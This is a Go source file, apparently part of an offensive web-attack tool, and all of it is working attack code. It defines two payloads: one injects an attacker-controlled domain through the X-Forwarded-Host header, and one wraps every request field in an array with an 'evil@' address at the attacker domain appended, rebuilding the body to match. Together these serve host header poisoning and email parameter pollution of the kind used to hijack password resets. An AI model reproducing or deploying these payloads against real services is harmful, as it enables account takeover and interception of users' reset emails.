package main

type Payload struct {
	Name        string
	Mode        string
	Description string
	Apply       func(r ParsedRequest, attackerDomain string) ParsedRequest
}

var Payloads = []Payload{
	{
		Name:        "X-Forwarded-Host",
		Mode:        "header",
		Description: "inject attacker domain via X-Forwarded-Host header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-Forwarded-Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Array injection",
		Mode:        "body",
		Description: "wrap field in values in array with attacker value appended",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = []any{v, "evil@" + attackerDomain}
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
}
